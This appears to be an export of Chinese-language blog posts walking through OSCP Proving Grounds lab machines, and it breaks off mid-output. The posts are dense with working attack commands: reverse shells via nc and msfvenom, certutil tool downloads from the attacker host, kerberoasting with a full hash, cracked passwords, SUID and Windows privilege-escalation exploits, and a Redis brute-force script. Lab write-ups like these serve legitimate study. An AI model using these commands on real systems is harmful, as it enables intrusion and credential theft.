Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Austronaut","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"信息收集 foothold 1python 49973.py escalationlinpeas 12345678www-data@gravity:~/html/grav-admin$ chmod +x linpeas_linux_amd64chmod +x linpeas_linux_amd64www-data@gravity:~/html/grav-admin$ ./linpeas_linux_amd64./linpeas_linux_amd64-rwsr-xr-x 1 root root 4.6M Feb 23 2023 /usr/bin/php7.4 (Unknown SUID binary!) 12345678If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.sudo install -m =xs $(which php) .CMD=&quot;/bin/sh&quot;./php -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot; 123456789101112131415161718www-data@gravity:~/html/grav-admin$ CMD=&quot;/bin/sh&quot;CMD=&quot;/bin/sh&quot;www-data@gravity:~/html/grav-admin$ /usr/bin/php7.4 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;&lt;/usr/bin/php7.4 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;iduid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)cd /rootlsflag1.txtproof.txtsnapcat flag1.txtT2Zmc2Vjcat proof.txtfe673fa7494c0960b67301335ecc2539whoamirootexit","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Access","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"categoriesAD scan 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970NetBIOS computer name: SERVERNetBIOS domain name: ACCESSDNS domain: access.offsecFQDN: SERVER.access.offsecOS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;1809&#x27;OS build: &#x27;17763&#x27;- ports- 53 domain- 80 / 443 apache 2.4.48 openssl/1.1.k php/8.0.7 http-title: Access The Event http-fetch: Please enter the complete path of the directory to save data in.- 135 msrpc- 139 netbios-ssn- 445 smb- 389 / 636 / 3268 ldap- 464 kpasswd5- 593 msrpc- 3269- 5985 winrm Microsoft-HTTPAPI/2.0- 9389 mc-nmf syn-ack ttl 125 .NET Message Framing- 47001 Microsoft-HTTPAPI/2.0 winrm- 88 udp kerberos- 123 ntp- 65024things to try1. web 80/443/470012. smb3. ldapsearchweb===============================================================/uploads (Status: 301) [Size: 344] [--&gt; http://192.168.197.187/uploads/]/assets (Status: 301) [Size: 343] [--&gt; http://192.168.197.187/assets/]/forms (Status: 301) [Size: 342] [--&gt; http://192.168.197.187/forms/] smbcliet12smbclient -L 192.168.197.187 -Nsession setup failed: NT_STATUS_ACCESS_DENIED rpcclient12rpcclient 192.168.197.187 -NCannot connect to server. Error was NT_STATUS_LOGON_FAILURE ldapsearch12345678910111213141516ldapsearch -H ldap://192.168.197.187 -x -b &quot;DC=access,DC=offsec&quot; |tee ldap_dump# extended LDIF## LDAPv3# base &lt;DC=access,DC=offsec&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## search resultsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563# numResponses: 1 footholdapache访问80端口 可以上传文件，上传 backdoor.php 修改php 大小写后缀都无法绕过，测试只要不是php就都可以 修改为backdoor.png，可以成功上传，但是直接访问时, content-Type是image, 不会当做php文件解析，不加后缀也一样会认为是文本文件 看了wirteup, 可以先上传.htaccess 文件，内容如下。添加.hhh拓展名按php解析， 然后上传revershell.hhh 1AddType application/x-httpd-php .hhh 执行后成功getshell 12345678910111213rlwrap nc -nlvp 4444listening on [any] 4444 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.187] 49944id&#x27;id&#x27; is not recognized as an internal or external command,operable program or batch file.whoamiaccess\\svc_apachecertutil -urlcache -f http://192.168.45.189/nc.exe nc.exe**** Online ****CertUtil: -URLCache command completed successfully.nc 192.168.45.189 4445 -e powershell shell 无法使用powershell, 嵌套一个 12345678910rlwrap nc -nlvp 4445listening on [any] 4445 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.187] 49837Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\xampp\\htdocs\\uploads&gt; whoamiwhoamiaccess\\svc_apachePS C:\\xampp\\htdocs\\uploads&gt; 使用bloodHound, winPeas都没有收集到能提权的信息， 用户有Administrator krbtgt svc_mssql 1234567net userUser accounts for \\\\SERVER-------------------------------------------------------------------------------Administrator krbtgt svc_mssqlThe command completed successfully. mssql使用powerView， get-netuser svc_mssql，发现其有SPN， 可以利用kerberoasting攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748PS C:\\users\\public&gt; iwr -uri http://192.168.45.189/PowerView.ps1 -o PowerView.ps1iwr -uri http://192.168.45.189/PowerView.ps1 -o PowerView.ps1PS C:\\users\\public&gt; net usernet userUser accounts for \\\\SERVER-------------------------------------------------------------------------------Administrator Guest krbtgtsvc_apache svc_mssqlThe command completed successfully.PS C:\\users\\public&gt; import-module .\\PowerView.ps1import-module .\\PowerView.ps1PS C:\\users\\public&gt; get-netuser svc_mssqlget-netuser svc_mssqlcompany : Accesslogoncount : 1badpasswordtime : 12/31/1600 4:00:00 PMdistinguishedname : CN=MSSQL,CN=Users,DC=access,DC=offsecobjectclass : &#123;top, person, organizationalPerson, user&#125;lastlogontimestamp : 4/8/2022 2:40:02 AMname : MSSQLobjectsid : S-1-5-21-537427935-490066102-1511301751-1104samaccountname : svc_mssqlcodepage : 0samaccounttype : USER_OBJECTaccountexpires : NEVERcn : MSSQLwhenchanged : 7/6/2022 5:23:18 PMinstancetype : 4usncreated : 16414objectguid : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9lastlogoff : 12/31/1600 4:00:00 PMobjectcategory : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsecdscorepropagationdata : 1/1/1601 12:00:00 AMserviceprincipalname : MSSQLSvc/DC.access.offsecgivenname : MSSQLlastlogon : 4/8/2022 2:40:02 AMbadpwdcount : 0useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORDwhencreated : 4/8/2022 9:39:43 AMcountrycode : 0primarygroupid : 513pwdlastset : 5/21/2022 5:33:45 AMmsds-supportedencryptiontypes : 0usnchanged : 73754 kerberoasting1234567891011121314151617181920212223242526272829303132333435363738certutil -urlcache -f http://192.168.45.189/Rubeus.exe Rubeus.execertutil -urlcache -f http://192.168.45.189/Rubeus.exe Rubeus.exe**** Online ****CertUtil: -URLCache command completed successfully.PS C:\\Users\\Public&gt; certutil -urlcache -f http://192.168.45.189/RunasCs.cs RunasCs.cscertutil -urlcache -f http://192.168.45.189/RunasCs.cs RunasCs.cs**** Online ****CertUtil: -URLCache command completed successfully.PS C:\\Users\\Public&gt; ./Rubeus kerberoast /nowrap./Rubeus kerberoast /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.1.2[*] Action: Kerberoasting[*] NOTICE: AES hashes will be returned for AES-enabled accounts.[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.[*] Target Domain : access.offsec[*] Searching path &#x27;LDAP://SERVER.access.offsec/DC=access,DC=offsec&#x27; for &#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;[*] Total kerberoastable users : 1[*] SamAccountName : svc_mssql[*] DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec[*] ServicePrincipalName : MSSQLSvc/DC.access.offsec[*] PwdLastSet : 5/21/2022 5:33:45 AM[*] Supported ETypes : RC4_HMAC_DEFAULT[*] Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$382AA795CCF9A04F44CEEEFCD1FD8F33$CD7620E731C3743BAC17757BC77D028468BAA335A8FB42FCDE33707E966ED4B62BBA771B68A2EBDC14BC3070767B1071413FB28333989028686F60143BEBC69CA96BD477633BED94E818DCB2471F666719A777D323DA3753699EF9BB3B367788AFBAC833437ADD2CFE453D30488444284672BE8CC1D39A32CF55A65BA162A704A7DFAE2B4597D617FBFB968D9D8574BC347478101DB03AC4AE76E89EE3609E8652DADDEC97DFD78990F866FF9396BC0EC2F2A169BC2D8FF51F608FFBC28DB9958E7B3C7982AF81DC9A319F8A3D83F446DB7C3C0984EF8A6BD1C5DFC4FC1BD94B032E72CB3AA31C2841A6171B6DA894E1E813FE243DD1D46959D627B54CC6FB0C877A041AA68F10425E8E8E49B185300A8206E0273C74F040E6892FDC11A9AAB1B6687FEC4CD7D4C518F8E3F8178002359A7ED4D2AD85E0A4E0257E23C4B4715BB161E0781BD4F3B8DD8F743256F72F578D67F6E0B854A5870DF4AC1CCA89B3EEE438BB81DD2DBE3008078E5A4E6BC597DC1F9286C0FE34DE1F0E18E788185E3D0651378354724C61D8B31974DCB7489F876C11ED95C34760B8341DBDECF32901DF2FEE6C0A40D0B2BC318DA8B2606D0AD94F215398EC2C4C99166E84906704C3411441888ED49E6AE6E535B272C2FCE416F0AFC9A2C3AF93F20B80FCBF9DB849B9DE7194F4A1AC1CE34F34990FC23204204835919AA46B778593E3892CAFFD6CC93157C3F2D7F4D8D11890F33B177BA3185DDB594D8B405BACEF4ACCEDAA43B8E1EA78FE2C4694FAF4C337465A2DBE9926113BB69D94F965B6F081E5596187617023D26C518D64B68207CEB1C7649AEC8F8455DE244A77BA416E90062A86D8AE527C9425C7240B856299C136099ADC853DE1902C0ED03E59C8AD0C9CA6CCD01AC692BDA53E9244BF5190B304EF9841FFC3A93FD958FD5F90C4E0630756F78E3603A636D38AE94DB666551F0B0382F96E6F66ED26A653C3E4E061F3AF9275ECED949D771EF7C00E811EFDA3F6ED7838674D10F6164F7BD1EC889178DEECC3C8A77FE968A9445258EBE43E289003485492B5812259292A3DE447A70D4A3A12020D1E1868262D6E4CA0627E2CF011F542B74750BF029E3AD751307890A155F1C5F17B998575EDB97FBA20BF41FF3EAEA109E3E2D5B6D8908AF766FACC5F7812727F2E99B120D269051AFFFC3CF1F61E4549DC1825930D4695E25D1729F22C1568B65CB4F774897E2FA7927DEDE7FC71D837218A3E01969AB5931200BC39941DDF1E78A467DD3FFB0261DA1C5D86AD2F3F118611D481A6EEC6AC4750EFBBDD9FA122365D483FDDDF28E9CFC7AF3B705753CCCDFB67DF96BE2B4F7FFAC53BBBA1D9D99A361E343DB6F14136DF720CFD3F6EDEE700D9A2B1F3CB49ADF22164A1C604A7C84288742E4241DFCF8B7F8CC5388663CA4C732CE9EAE625ECB4AFE44B7E83386E7C4226E71AA56DB9E8810BB41BD3DE841D1DB1D9AE7DC525BBA7C5D564FEBC518347D5E785A39E301134BB50BC2BD3EBDF979E291A4A4C37EC53D42289122C120CA31325CC8D729A68F32FC86CDB575D0E5F89B482508C14C9D959B996F3F95F918B3CE3BD6CB369F196458290680F5135 破解hash，得到密码为trustno1 123456789john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statustrustno1 (?)1g 0:00:00:00 DONE (2025-02-07 21:57) 16.66g/s 34133p/s 34133c/s 34133C/s 123456..lovers1Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. 使用runascs 在命令行使用svc_mssql反弹shell 123456789101112131415161718192021222324PS C:\\Users\\Public&gt; certutil -urlcache -f http://192.168.45.189/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1certutil -urlcache -f http://192.168.45.189/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1**** Online ****CertUtil: -URLCache command completed successfully.PS C:\\Users\\Public&gt; import-module .\\Invoke-RunasCs.ps1import-module .\\Invoke-RunasCs.ps1PS C:\\Users\\Public&gt; import-module .\\Invoke-RunasCs.ps1import-module .\\Invoke-RunasCs.ps1PS C:\\Users\\Public&gt; Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe 192.168.45.189 4446 -e powershell&#x27;Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe 192.168.45.189 4446 -e powershell&#x27;[*] Warning: The logon for user &#x27;svc_mssql&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.No output received from the process.PS C:\\Users\\Public&gt;PS C:\\Users\\Public&gt;PS C:\\Users\\Public&gt; Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe 192.168.45.189 4446 -e powershell&#x27;Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe 192.168.45.189 4446 -e powershell&#x27;[*] Warning: The logon for user &#x27;svc_mssql&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.No output received from the process. 获取svc_mssql shell 1234567891011rlwrap nc -nlvp 4446listening on [any] 4446 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.187] 50114Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32&gt; whoamiwhoamiaccess\\svc_mssqlPS C:\\Windows\\system32&gt; whoami /allwhoami /all escalationwalkThroughf 利用的是SeManageVolumePrivilege提权，过程有点复杂，按步骤没利用成功 12345678910111213PS C:\\users\\public&gt; whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ================================ ========SeMachineAccountPrivilege Add workstations to domain DisabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeManageVolumePrivilege Perform volume maintenance tasks DisabledSeIncreaseWorkingSetPrivilege Increase a process working set DisabledPS C:\\users\\public&gt; 记录步骤如下, release下载SeManageVolumeExploit.exe , 执行后buildin users有C:&#x2F;Windows的FULL permissions https://github.com/CsEnox/SeManageVolumeExploit https://github.com/CsEnox/SeManageVolumeExploit/releases 1234567891011121314C:\\xampp\\htdocs\\uploads&gt;whoamiaccess\\svc_mssqlC:\\xampp\\htdocs\\uploads&gt;SeManageVolumeExploit.exeEntries changed: 865DONE C:\\xampp\\htdocs\\uploads&gt;icacls C:/WindowsC:/Windows NT SERVICE\\TrustedInstaller:(F) NT SERVICE\\TrustedInstaller:(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(M) NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F) BUILTIN\\Users:(M) BUILTIN\\Users:(OI)(CI)(IO)(F) https://github.com/sailay1996/WerTrigger Copy phoneinfo.dll to _C:\\Windows\\System32_ Place Report.wer file and WerTrigger.exe in a same directory. Run WerTrigger.exe. 1234567891011121314151617C:\\xampp\\htdocs\\uploads\\enox&gt;dirdir Volume in drive C has no label. Volume Serial Number is CCC2-BF17 Directory of C:\\xampp\\htdocs\\uploads\\enox10/10/2021 07:25 PM &lt;DIR&gt; .10/10/2021 07:25 PM &lt;DIR&gt; ..10/10/2021 07:23 PM 9,252 Report.wer10/10/2021 07:23 PM 15,360 WerTrigger.exe 2 File(s) 24,612 bytes 2 Dir(s) 50,123,882,496 bytes freeC:\\xampp\\htdocs\\uploads\\enox&gt;WerTrigger.exeWerTrigger.exec:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe get shell 12345678910111213┌──(kali㉿kali)-[~]└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49998Microsoft Windows [Version 10.0.17763.2746](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoami &amp;&amp; hostname whoami &amp;&amp; hostname nt authority\\systemSERVERC:\\Windows\\system32&gt; 反思 发现上传jpg文件按文本传输时，应该搜索解决办法，毕竟在当时是唯一的可利用的点 获取apache shell之后，收集信息看到svc_mssql时不要认为是一个类似系统账号的用户，就像之前靶机的V.Ventz用户一样，发现什么就是什么，多尝试 AD的知识太匮乏了，需要多学习总结，什么场景下能利用什么要有清晰的概念才行","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - AuthBy","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan 开放端口 21 ftp 可以匿名登录 242 web访问需要密码，目录扫描返回都是401 foothold1234567891011121314151617181920212223242526272829303132333435ftp -a -A 192.168.173.46Connected to 192.168.173.46.220 zFTPServer v6.0, build 2011-10-17 14:25 ready.331 User name received, need password.230 User logged in, proceed.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 EPRT Command successful.150 Opening connection for /bin/ls.total 9680---------- 1 root root 5610496 Oct 18 2011 zFTPServer.exe---------- 1 root root 25 Feb 10 2011 UninstallService.bat---------- 1 root root 4284928 Oct 18 2011 Uninstall.exe---------- 1 root root 17 Aug 13 2011 StopService.bat---------- 1 root root 18 Aug 13 2011 StartService.bat---------- 1 root root 8736 Nov 09 2011 Settings.inidr-xr-xr-x 1 root root 512 Feb 05 10:21 log---------- 1 root root 2275 Aug 09 2011 LICENSE.htm---------- 1 root root 23 Feb 10 2011 InstallService.batdr-xr-xr-x 1 root root 512 Nov 08 2011 extensionsdr-xr-xr-x 1 root root 512 Nov 08 2011 certificatesdr-xr-xr-x 1 root root 512 Aug 03 2024 accounts226 Closing data connection.ftp&gt; cd accounts250 CWD Command successful.ftp&gt; ls200 EPRT Command successful.150 Opening connection for /bin/ls.total 4dr-xr-xr-x 1 root root 512 Aug 03 2024 backup---------- 1 root root 764 Aug 03 2024 acc[Offsec].uac---------- 1 root root 1030 Aug 03 2024 acc[anonymous].uac---------- 1 root root 926 Aug 03 2024 acc[admin].uac226 Closing data connection. 有admin,offsec账号其他文件尝试下载都无权限Access Denied尝试admin, 弱密码admin成功登录 12345678910111213141516ftp -A 192.168.173.46Connected to 192.168.173.46.220 zFTPServer v6.0, build 2011-10-17 14:25 ready.Name (192.168.173.46:kali): admin 331 User name received, need password.Password:230 User logged in, proceed.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 EPRT Command successful.150 Opening connection for /bin/ls.total 3-r--r--r-- 1 root root 76 Nov 08 2011 index.php-r--r--r-- 1 root root 45 Nov 08 2011 .htpasswd-r--r--r-- 1 root root 161 Nov 08 2011 .htaccess 下载.htpasswd 和 index.php 12345678.htpasswd内容offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0hashcat -h |grep apr 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server hashcat -m 1600 hash1 /usr/share/wordlists/rockyou.txt破解出密码 elite 使用offsec：elite登录 发现和index.php中内容相同 1&lt;center&gt;&lt;pre&gt;Qui e nuce nuculeum esse volt, frangit nucem!&lt;/pre&gt;&lt;/center&gt; 生成php反弹shell码 12345msfvenom -p php/reverse_php LHOST=192.168.45.169 LPORT=4444 -f raw -o b.phpmsf 反弹shellmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.169 LPORT=4444 -f raw -o r.php 通过ftp上传 12http://192.168.173.46:242/r.phphttp://192.168.173.46:242/b.php 12345nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.169] from (UNKNOWN) [192.168.173.46] 49178whoamilivda\\apache msf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152sudo msfconsole -q[sudo] password for kali:[*] Starting persistent handler(s)...msf6 &gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; show optionsPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Wildcard TargetView the full module info with the info, or info -d command.msf6 exploit(multi/handler) &gt; set LHost 192.168.45.169LHost =&gt; 192.168.45.169msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.45.169:4444[*] Sending stage (39927 bytes) to 192.168.173.46[*] Meterpreter session 1 opened (192.168.45.169:4444 -&gt; 192.168.173.46:49168) at 2025-02-05 10:33:58 +0800meterpreter &gt; sessionsUsage: sessions [options] or sessions [id]Interact with a different session ID.OPTIONS: -h, --help Show this message -i, --interact &lt;id&gt; Interact with a provided session IDmeterpreter &gt; getuidServer username: apachemeterpreter &gt; sysinfoComputer : LIVDAOS : Windows NT LIVDA 6.0 build 6001 (Windows Server 2008 Standard Edition Service Pack 1) i586Meterpreter : php/windowsmeterpreter &gt; ls escalationwindow 2008 存在 Task Scheduler Privilege Escalation漏洞 12searchsploit &quot;&quot;Privilege Escalation&quot;&quot; | uniq | grep -v metasploit | grep -i &quot;&quot;windows &quot;&quot;Microsoft Windows - Task Scheduler Privilege Escalation | exploits/windows/local/15589.wsf 脚本会添加test123用户并加入到administrator组 上传到服务器上执行 1234567891011121314151617181920cscript .\\15589.wsfMicrosoft (R) Windows Script Host Version 5.7Copyright (C) Microsoft Corporation. All rights reserved. Task Scheduler 0 day - Privilege Escalation Should work on Vista/Win7/2008 x86/x64 webDEViL - w3bd3vil [at] gmail [dot] comCrc32 Original: F2C9A178Crc32 Magic Bytes: 0662FAA1Crc32 Forged: F2C9A178net userUser accounts for \\\\LIVDA-------------------------------------------------------------------------------Administrator apache Guesttest123The command completed successfully. test123用户成功添加 通过rdp登录成功 123456直接登录报错xfreerdp /cert-ignore /u:test123 /p:test123 /v:192.168.173.46[10:48:00:759] [13914:13916] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]需要执行sec:rdpxfreerdp /u:test123 /p:test123 /v:192.168.173.46 /sec:rdp 反思 看到apache + php 的漏洞时尝试是对的，没成功时，应该详细看下脚本内容，确定是执行方式不正确还是不符合利用条件，不要一味瞎试浪费时间 zftpserver 漏洞同样，明显不能利用的不要浪费太多时间 admin和offsec的密码应该尝试密码爆破，如果弱密码登录不成功不能放弃，爆破出密码之后要尝试直接rdp登录 xfreerdp登录不成功要找原因，并且尝试其他工具如rdesktop，不能觉得是工具问题就放弃了 windows服务器上，winpeas和其他多个程序不能执行，要尝试其他方式，比如msf, 虽然使用msf 执行wsf脚本也失败了，最终还是直接在机器上执行 不要太依赖自动化信息收集工具，无法执行时，要能通过手动方式收集定时任务，系统漏洞，unquot server path、服务重启等实现提权 windows 系统漏洞利用需要多搜索，直接使用searchsploit 搜出来的内容太多了，需要在筛选分析总之，多尝试，多搜索","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Blackgate","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"信息收集 开放端口： 22 6379 12345678910111213141516171819202122edis-cli -h 192.168.125.176192.168.125.176:6379&gt; info# Serverredis_version:4.0.14redis_git_sha1:00000000redis_git_dirty:0redis_build_id:25b410d64d050b9eredis_mode:standaloneos:Linux 5.8.0-63-generic x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:10.2.0process_id:1700run_id:55f1eff5db87decfca36f2cdd8796002c1d3e3d2tcp_port:6379uptime_in_seconds:2697uptime_in_days:0hz:10lru_clock:9341233executable:/usr/local/bin/redis-serverconfig_file: foothold尝试写&#x2F;root&#x2F;.ssh 没有权限，写crontab无权限 写脚本爆破用户名，得到prudence, 尝试写&#x2F;home&#x2F;prudence&#x2F;.ssh 发现没有.ssh文件夹 12345678910111213141516171819202122232425262728293031323334import redisimport concurrent.futures# 在外部创建 Redis 连接r = redis.StrictRedis(host=&#x27;192.168.125.176&#x27;, port=6379, db=0)def set_redis_config(line): dir = f&quot;/home/&#123;line.strip()&#125;&quot; try: ret = r.config_set(&quot;dir&quot;, dir) print(f&quot;Successfully set config for: &#123;line.strip()&#125;&quot;) return ret # 这里可以返回结果给主线程 except Exception as e: # print(f&quot;Error setting config for &#123;line.strip()&#125;: &#123;e&#125;&quot;) return None # 发生错误时返回 None# 使用线程池并行处理with open(&#x27;/usr/share/seclists/Usernames/Names/names.txt&#x27;, &#x27;r&#x27;) as f: lines = f.readlines()with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor: results = executor.map(set_redis_config, lines)count = 1# 如果需要打印结果，可以遍历并输出for result in results: # count += 1 # print(count # ) if result is not None: print(f&quot;Result: &#123;result&#125;&quot;)prudence redis-rogue查看hits 利用 https://github.com/vulhub/redis-rogue-getshell https://github.com/n0b0dyCN/redis-rogue-server 1234567891011121314151617./redis-rogue-server.py --rhost 192.168.125.176 --lhost 192.168.45.152/home/kali/Tools/pg/blackgate/redis-rogue-server/./redis-rogue-server.py:10: SyntaxWarning: invalid escape sequence &#x27;\\ &#x27; BANNER = &quot;&quot;&quot;______ _ _ ______ ___________ _ _ ______ _____| ___ \\ | (_) | ___ \\ / ___|| |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __| // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ &#x27;__\\ \\ / / _ \\ &#x27;__|| |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ |\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/@copyright n0b0dy @ r3kapig[info] TARGET 192.168.125.176:6379[info] SERVER 192.168.45.152:21000[info] Setting master...[info] Setting dbfilename... 一直卡住，换用其他exp，一样的结果，最后设置系统代理翻墙后成功获得shell escalation123456789101112131415161718192021ss linux 5.8---------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------- ---------------------------------cPanel 5 &lt; 9 - Local Privilege Escalation | linux/local/24141.txtCyberArk &lt; 10 - Memory Disclosure | linux/remote/44829.pyCyberArk Password Vault &lt; 9.7 / &lt; 10 - Memory Disclosure | linux/dos/44428.txtDenyAll WAF &lt; 6.3.0 - Remote Code Execution (Metasploit) | linux/webapps/42769.rbElm &lt; 2.5.8 - Expires Header Remote Buffer Overflow | linux/remote/1171.cFVWM 2.4.17/2.5.8 - fvwm_make_browse_menu.sh Scripts Command Execution | linux/local/23849.txtGV PostScript Viewer - Remote Buffer Overflow (1) | linux/remote/390.cGV PostScript Viewer - Remote Buffer Overflow (2) | linux/remote/400.cJAD Java Decompiler 1.5.8e - Local Buffer Overflow | linux/local/42076.pyJAD Java Decompiler 1.5.8e - Local Buffer Overflow (NX Enabled) | linux/local/42255.pyLibreOffice &lt; 6.0.1 - &#x27;=WEBSERVICE&#x27; Remote Arbitrary File Disclosure | linux/remote/44022.mdLinux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privilege Escalation | solaris/local/15962.cLinux Kernel 2.4/2.6 (RedHat Linux 9 / 